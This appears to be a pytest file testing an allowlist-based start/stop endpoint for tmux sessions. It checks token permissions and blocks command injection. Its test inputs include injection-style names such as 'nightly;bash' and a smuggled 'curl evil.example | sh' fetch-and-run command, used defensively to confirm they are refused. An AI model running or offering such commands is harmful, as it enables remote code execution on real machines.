"""Starting and stopping the things this machine said it would.

The whole arrangement rests on one decision: **no command ever arrives in a request.** A
board holds a watcher token per machine in a file, and its own token sits in the storage of
every browser that has opened it. Those keys are safe to spread around only because they are
worth almost nothing — and an endpoint that took a shell line would have ended that in one
step.

So this machine publishes a list of names, and a caller may ask for one of them. What these
tests are really checking is that there is no way through that list.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from app import runner, tmux
from app.config import Config, ConfigError
from app.main import create_app

FULL = "full-0123456789abcdef0123456789abcdef"
WATCH = "watch-0123456789abcdef0123456789ab"

OFFERED = [
    {"name": "nightly", "run": "python3 nightly.py", "cwd": "/tmp"},
    {"name": "claude", "run": "claude --resume", "cwd": ""},
]


def wired(tmp_path, *, may_run=True, may_stop=False, runnable=None):
    cfg = Config(
        token=FULL,
        roots=[tmp_path],
        runnable=list(OFFERED if runnable is None else runnable),
        watchers=[{"name": "panoptes", "token": WATCH,
                   "may_run": may_run, "may_stop_argus": may_stop}],
    )
    cfg.validate()
    return TestClient(create_app(cfg)), cfg


WEAK = {"Authorization": f"Bearer {WATCH}"}


# ------------------------------------------------------------------ what may be asked for

def test_a_board_is_told_the_names_and_not_the_commands(tmp_path):
    """The shell line is of no use to a board and is one more thing a leaked board leaks."""
    client, _ = wired(tmp_path)
    said = client.get("/api/runnable", headers=WEAK)
    assert said.status_code == 200
    assert [r["name"] for r in said.json()] == ["nightly", "claude"]
    assert "nightly.py" not in said.text and "--resume" not in said.text
    assert all("running" in r for r in said.json())


def test_a_name_that_was_never_offered_is_refused(tmp_path):
    """The list is the whole security boundary, so this is the test that matters."""
    client, _ = wired(tmp_path)
    for name in ("bash", "rm", "nightly2", "nightly;bash", "NIGHTLY"):
        answer = client.post(f"/api/runnable/{name}/start", headers=WEAK)
        assert answer.status_code == 404, name

    # `../nightly` never reaches the handler: the client normalises it and it lands outside
    # the prefix the watcher is allowed at all. Refused either way, which is the point.
    assert client.post("/api/runnable/../nightly/start", headers=WEAK).status_code in (403, 404)


def test_only_start_and_stop(tmp_path):
    client, _ = wired(tmp_path)
    for action in ("restart", "kill", "exec", "eval"):
        assert client.post(f"/api/runnable/nightly/{action}", headers=WEAK).status_code == 404


def test_a_command_cannot_be_smuggled_in_a_body(tmp_path):
    """There is nowhere for it to go — the handler never reads one — and this says so, since
    "the handler happens not to read it" is the kind of fact that changes by accident."""
    client, _ = wired(tmp_path)
    calls = []
    runner.tmux.session_exists = lambda *a: False              # type: ignore[assignment]
    runner.tmux.run = lambda argv: calls.append(argv)          # type: ignore[assignment]
    try:
        client.post("/api/runnable/nightly/start", headers=WEAK,
                    json={"run": "curl evil.example | sh", "cwd": "/"})
    finally:
        import importlib
        importlib.reload(tmux)
    assert calls, "nothing was run at all"
    assert "evil.example" not in " ".join(calls[0])
    assert "python3 nightly.py" in calls[0]


# ---------------------------------------------------------------------------- who may ask

def test_a_watcher_without_may_run_cannot(tmp_path):
    """Off unless asked for: every board that already exists must not become able to restart
    things because a new version shipped."""
    client, _ = wired(tmp_path, may_run=False)
    assert client.get("/api/overview", headers=WEAK).status_code == 200
    assert client.get("/api/runnable", headers=WEAK).status_code == 403
    assert client.post("/api/runnable/nightly/start", headers=WEAK).status_code == 403


def test_stopping_argus_needs_its_own_permission(tmp_path):
    """It is the one thing a board cannot undo, so `may_run` is not enough for it."""
    client, _ = wired(tmp_path, may_run=True, may_stop=False)
    assert client.post("/api/shutdown", headers=WEAK).status_code == 403


def test_a_permission_that_cannot_work_is_refused_at_startup(tmp_path):
    """`may_stop_argus` without `may_run` reads as allowed and behaves as forbidden."""
    cfg = Config(token=FULL, roots=[tmp_path], runnable=list(OFFERED),
                 watchers=[{"name": "p", "token": WATCH, "may_run": False, "may_stop_argus": True}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_offering_nothing_while_allowing_running_is_refused(tmp_path):
    cfg = Config(token=FULL, roots=[tmp_path], runnable=[],
                 watchers=[{"name": "p", "token": WATCH, "may_run": True}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_a_runnable_name_has_to_be_addressable(tmp_path):
    """It becomes a tmux session name and part of a URL path."""
    for bad in ("has space", "a:b", "a.b/c", "", "x" * 100):
        cfg = Config(token=FULL, roots=[tmp_path],
                     runnable=[{"name": bad, "run": "sleep 1", "cwd": ""}])
        with pytest.raises(ConfigError):
            cfg.validate()


def test_two_runnables_cannot_share_a_name(tmp_path):
    cfg = Config(token=FULL, roots=[tmp_path], runnable=[
        {"name": "same", "run": "a", "cwd": ""}, {"name": "same", "run": "b", "cwd": ""}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_a_runnable_with_nothing_to_run_is_refused(tmp_path):
    cfg = Config(token=FULL, roots=[tmp_path], runnable=[{"name": "empty", "run": "", "cwd": ""}])
    with pytest.raises(ConfigError):
        cfg.validate()


# ------------------------------------------------------------------------- what it does

def test_asking_twice_is_not_an_error(tmp_path):
    """Two people press the same button, or a board retries a request whose answer was lost.
    Neither is a failure and neither should read as one."""
    client, cfg = wired(tmp_path)
    runner.tmux.session_exists = lambda *a: True               # type: ignore[assignment]
    try:
        said = client.post("/api/runnable/nightly/start", headers=WEAK).json()
        assert said["did"] == runner.ALREADY
    finally:
        import importlib
        importlib.reload(tmux)


def test_stopping_something_that_is_not_running_says_so(tmp_path):
    client, _ = wired(tmp_path)
    runner.tmux.session_exists = lambda *a: False              # type: ignore[assignment]
    try:
        assert client.post("/api/runnable/nightly/stop", headers=WEAK).json()["did"] == runner.NOT_RUNNING
    finally:
        import importlib
        importlib.reload(tmux)


def test_the_command_and_the_folder_come_from_the_config(tmp_path):
    sock = tmux.Socket.new("test-only")
    argv = runner.start_argv(sock, OFFERED[0])
    assert argv[-1] == "python3 nightly.py"
    assert "-c" in argv and "/tmp" in argv
    assert "-s" in argv and "nightly" in argv


def test_stopping_kills_that_session_exactly(tmp_path):
    """`=name` is an exact match. Without it tmux takes a prefix, and killing the wrong
    session because two names share a beginning is not a risk worth carrying."""
    sock = tmux.Socket.new("test-only")
    assert f"={OFFERED[0]['name']}" in tmux.kill_argv(sock, OFFERED[0]["name"])
